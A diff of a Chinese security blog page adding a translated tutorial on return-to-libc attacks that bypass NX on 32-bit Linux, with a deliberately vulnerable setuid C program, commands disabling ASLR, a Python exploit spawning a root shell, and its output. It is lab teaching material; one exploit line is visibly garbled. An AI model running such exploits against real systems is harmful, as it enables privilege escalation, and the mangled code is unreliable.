@@ -112,6 +112,103 @@
         
           <section id="main">
   
+    <article id="post-returntolibc"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20161231/returntolibc/">Return-to-libc绕过NX</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20161231/returntolibc/" class="article-date">
+	  <time datetime="2016-12-31T14:20:03.000Z" itemprop="datePublished">十二月 31, 2016</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0X01 什么是NX比特位</li>
+<li>0X02 如何绕过NX比特位做到任意代码执行</li>
+<li>0X03 什么是最低权限准则</li>
+<li>0X04 root setuid程序漏洞利用 </li>
+</ul>
+</blockquote>
+<p><u><em>阅读基础:</em></u></p>
+<ol>
+<li><a href="http://www.csyssec.org/20161231/stackbufferflow/" target="_blank" rel="external">经典栈缓冲区溢出</a></li>
+</ol>
+<p><u><em>VM Setup:</em></u> Ubuntu 12.04 (x86)</p>
+<p>在前面的文章中，我们可以了解到，攻击者可以：</p>
+<pre><code>将shellcode拷贝到栈中，再跳转到shellcode
+</code></pre><p>来达到成功利用漏洞代码的目的。</p>
+<p>因此，为了阻止攻击者的行为，安全研究人员开始利用“NX”比特位来缓解漏洞利用方法(exploit mitigation)。 </p>
+<h3 id="什么是NX比特位"><a href="#什么是NX比特位" class="headerlink" title="什么是NX比特位"></a>什么是NX比特位</h3><p>这种漏洞利用缓解方法将指定内存区域设置为不可执行，并将可执行的区域设置为不可写。举个例子：数据段、栈和堆设置为不可执行，text段设置为不可写。</p>
+<p>设置NX位后，经典的栈缓冲区溢出无法利用其漏洞。那是因为，在经典的方法中，shellcode被拷贝到栈中，返回地址指向shellcode。然而，现在的情况是栈被设置位不可执行，漏洞利用(exploit)就会失败。 当然，这种缓解(mitigation)技术也不是完全安全的，这篇文章就来看看我们是如何绕过NX比特位的!!!</p>
+<p><u>漏洞代码</u>： 下面这份代码基于前文中漏洞代码作了一点修改。我会在后文中讲述修改的必要性。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [1] */</span> </div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]); <span class="comment">/* [2] */</span></div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf); <span class="comment">/* [3] */</span></div><div class="line"> fflush(<span class="built_in">stdout</span>);  <span class="comment">/* [4] */</span></div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><u>编译命令</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
+<p><u>注意</u>: “-z exexstack”参数并没有传递给gcc,因此这时栈是不可执行的(Non eXecutable)，可以通过下述方法来验证：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ readelf -l vuln</div><div class="line">...</div><div class="line">Program Headers:</div><div class="line"> Type      Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</div><div class="line"> PHDR      <span class="number">0x000034</span> <span class="number">0x08048034</span> <span class="number">0x08048034</span> <span class="number">0x00120</span> <span class="number">0x00120</span> R E <span class="number">0x4</span></div><div class="line"> INTERP    <span class="number">0x000154</span> <span class="number">0x08048154</span> <span class="number">0x08048154</span> <span class="number">0x00013</span> <span class="number">0x00013</span> R <span class="number">0x1</span></div><div class="line"> [Requesting program interpreter: /lib/ld-linux.so<span class="number">.2</span>]</div><div class="line"> LOAD      <span class="number">0x000000</span> <span class="number">0x08048000</span> <span class="number">0x08048000</span> <span class="number">0x00678</span> <span class="number">0x00678</span> R E <span class="number">0x1000</span></div><div class="line"> LOAD      <span class="number">0x000f14</span> <span class="number">0x08049f14</span> <span class="number">0x08049f14</span> <span class="number">0x00108</span> <span class="number">0x00118</span> RW <span class="number">0x1000</span></div><div class="line"> DYNAMIC   <span class="number">0x000f28</span> <span class="number">0x08049f28</span> <span class="number">0x08049f28</span> <span class="number">0x000c8</span> <span class="number">0x000c8</span> RW <span class="number">0x4</span></div><div class="line"> NOTE      <span class="number">0x000168</span> <span class="number">0x08048168</span> <span class="number">0x08048168</span> <span class="number">0x00044</span> <span class="number">0x00044</span> R <span class="number">0x4</span></div><div class="line"> ...</div><div class="line"> GNU_STACK <span class="number">0x000000</span> <span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x00000</span> <span class="number">0x00000</span> RW <span class="number">0x4</span></div><div class="line"> GNU_RELRO <span class="number">0x000f14</span> <span class="number">0x08049f14</span> <span class="number">0x08049f14</span> <span class="number">0x000ec</span> <span class="number">0x000ec</span> R <span class="number">0x1</span></div><div class="line">$</div></pre></td></tr></table></figure>
+<p>栈中只有RW标志位，并没有E标志位！</p>
+<h3 id="如何绕过NX比特位做到任意代码执行"><a href="#如何绕过NX比特位做到任意代码执行" class="headerlink" title="如何绕过NX比特位做到任意代码执行"></a>如何绕过NX比特位做到任意代码执行</h3><p>可以通过“return-to-libc”技术来绕过NX比特位。这里，返回地址被一种特殊的libc函数地址(而不是含有shellcode代码的栈地址)覆盖。举个例子，如果攻击者想触发一个shell, 他会利用system()地址来覆盖返回地址并设置好system()在栈中需要的必要参数，以便能成功调用system()。 </p>
+<p>之前我们已经反汇编并画出了漏洞代码的栈布局。现在开始写个漏洞利用代码来绕过NX比特位吧！</p>
+<p><u>漏洞利用代码</u></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#exp.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it. </div><div class="line">#For example system address = libc base address + system offset</div><div class="line">#where </div><div class="line">       #libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps)</div><div class="line">       #system offset     = 0x0003f060 (obtained from "readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system")</div><div class="line"></div><div class="line">system = 0xb7e61060        #0xb7e2000+0x0003f060</div><div class="line">exit = 0xb7e54be0          #0xb7e2000+0x00032be0</div><div class="line"></div><div class="line">#system_arg points to 'sh' substring of 'fflush' string. </div><div class="line">#To spawn a shell, system argument should be 'sh' and hence this is the reason for adding line [4] in vuln.c. </div><div class="line">#But incase there is no 'sh' in vulnerable binary, we can take the other approach of pushing 'sh' string at the end of user input!!</div><div class="line">system_arg = 0x804827d     #(obtained from hexdump output of the binary)</div><div class="line"></div><div class="line">#endianess conversion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack("&lt;I",numystem + exit + system_arg</div><div class="line">buf = "A" * 268</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print "Calling vulnerable program"</div><div class="line">call(["./vuln", buf])</div></pre></td></tr></table></figure>
+<p>执行上述漏洞利用代码，可以得到一个具有root权限的shell,如下图所示：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���K��&#125;�</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
+<p>太棒了，我们拿到了root shell! 但在实际应用程序中，root setuid 程序设置了最低权限准则，获取root shell并没那么容易！ </p>
+<h3 id="什么是最低权限准则"><a href="#什么是最低权限准则" class="headerlink" title="什么是最低权限准则"></a>什么是最低权限准则</h3><p>这种技术允许root setuid程序只有在需要的情况下才能获取root权限。也就是说，在需要时，root setuid程序拿到root 权限，不需要时就会丢弃已获取的权限。root setuid一般会在接收用户输入之前会丢弃root权限。因此，尽管用户输入是恶意的，攻击者也无法后去root shell。 举个例子，下面的漏洞代码不允许攻击者获取root shell。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln_priv.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> seteuid(getuid()); <span class="comment">/* Temporarily drop privileges */</span> </div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>对于上述漏洞程序，当我们执行下面的漏洞利用代码时，无法获取root shell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#exp_priv.py</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">system = <span class="number">0xb7e61060</span></div><div class="line">exit = <span class="number">0xb7e54be0</span></div><div class="line"></div><div class="line">system_arg = <span class="number">0x804829d</span></div><div class="line"></div><div class="line"><span class="comment">#endianess conversion</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span></div><div class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,numystem + exit + system_arg</div><div class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln_priv"</span>, buf])</div></pre></td></tr></table></figure>
+<p><u>注意</u>:exp_priv.py对exp.py稍作了一点修改！仅仅调整了system_arg变量</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ python exp_priv.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���K川�</div><div class="line">$ id</div><div class="line">uid=1000(sploitfun) gid=1000(sploitfun) egid=0(root) groups=1000(sploitfun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)</div><div class="line">$ rm /bin/ls</div><div class="line">rm: remove write-protected regular file `/bin/ls'? y</div><div class="line">rm: cannot remove `/bin/ls': Permission denied</div><div class="line">$ exit</div><div class="line">$</div></pre></td></tr></table></figure>
+<pre><code>到这里就完事了吗？那该如何对应用最低权限准则的root setuid程序进行漏洞利用呢？
+</code></pre><h3 id="root-setuid程序漏洞利用"><a href="#root-setuid程序漏洞利用" class="headerlink" title="root setuid程序漏洞利用"></a>root setuid程序漏洞利用</h3><p>针对漏洞代码(vuln_priv)，漏洞利用程序(exp_priv.py)调用system()再紧接着调用exit()还不足以获取root shell。 但如果能修改一下漏洞利用程序(exp_priv.py)，以下面的顺序调用libc函数：</p>
+<ul>
+<li>setuid(0)</li>
+<li>system(“sh”)</li>
+<li>exit()</li>
+</ul>
+<p>这样一来我们就能获取root shell。 这种技术叫做return-to-libc链接(chaining)，将会在<a href="http://www.csyssec.org/20170101/chainingreturntolibc/" target="_blank" rel="external">下一篇</a>中讨论</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-systemcall64list"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
@@ -1298,6 +1395,18 @@ size:拥有在TOP4会议中发表论文的作者数量
               <div class="widget-entry-summary" style="margin: 0;">
             
 
+              <h6 style="margin: 0;"><a href="/20170102/kvmqemuintro/">KVM/QEMU虚拟化简介</a></h6>
+              <span>一月 2, 2017</span>
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
               <h6 style="margin: 0;"><a href="/20170102/libvmikvm/">KVM Support in Libvmi</a></h6>
               <span>一月 2, 2017</span>
             </div>
@@ -1400,18 +1509,6 @@ size:拥有在TOP4会议中发表论文的作者数量
 
           </li>
         
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20161231/returntolibc/">Return-to-libc绕过NX</a></h6>
-              <span>十二月 31, 2016</span>
-            </div>
-
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -1422,7 +1519,7 @@ size:拥有在TOP4会议中发表论文的作者数量
   <div class="widget-wrap">
     <h3 class="widget-title">分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">4</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">4</span></li></ul>
     </div>
   </div>
 
@@ -1432,7 +1529,7 @@ size:拥有在TOP4会议中发表论文的作者数量
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Conference/">Conference</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exploit/">Exploit</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Introspection/">Introspection</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KVM/">KVM</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/">Kernel</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Memory/">Memory</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Overflow/">Overflow</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack/">Stack</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/System/">System</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtualization/">Virtualization</a><span class="tag-list-count">4</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Conference/">Conference</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exploit/">Exploit</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Introspection/">Introspection</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KVM/">KVM</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/">Kernel</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Memory/">Memory</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Overflow/">Overflow</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QEMU/">QEMU</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack/">Stack</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/System/">System</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtualization/">Virtualization</a><span class="tag-list-count">5</span></li></ul>
     </div>
   </div>
 
@@ -1442,7 +1539,7 @@ size:拥有在TOP4会议中发表论文的作者数量
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Exploit/" style="font-size: 16.67px;">Exploit</a> <a href="/tags/Introspection/" style="font-size: 15px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 10px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 11.67px;">Kernel</a> <a href="/tags/Linux/" style="font-size: 13.33px;">Linux</a> <a href="/tags/Memory/" style="font-size: 13.33px;">Memory</a> <a href="/tags/Overflow/" style="font-size: 11.67px;">Overflow</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Stack/" style="font-size: 11.67px;">Stack</a> <a href="/tags/System/" style="font-size: 18.33px;">System</a> <a href="/tags/Virtualization/" style="font-size: 15px;">Virtualization</a>
+      <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Exploit/" style="font-size: 17.14px;">Exploit</a> <a href="/tags/Introspection/" style="font-size: 14.29px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 11.43px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 11.43px;">Kernel</a> <a href="/tags/Linux/" style="font-size: 12.86px;">Linux</a> <a href="/tags/Memory/" style="font-size: 12.86px;">Memory</a> <a href="/tags/Overflow/" style="font-size: 11.43px;">Overflow</a> <a href="/tags/QEMU/" style="font-size: 10px;">QEMU</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Stack/" style="font-size: 11.43px;">Stack</a> <a href="/tags/System/" style="font-size: 18.57px;">System</a> <a href="/tags/Virtualization/" style="font-size: 15.71px;">Virtualization</a>
     </div>
   </div>
 
@@ -1452,7 +1549,7 @@ size:拥有在TOP4会议中发表论文的作者数量
     <h3 class="widget-title">归档</h3>
 
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">十二月 2016</a><span class="archive-list-count">8</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">十二月 2016</a><span class="archive-list-count">8</span></li></ul>
     </div>
   </div>
 
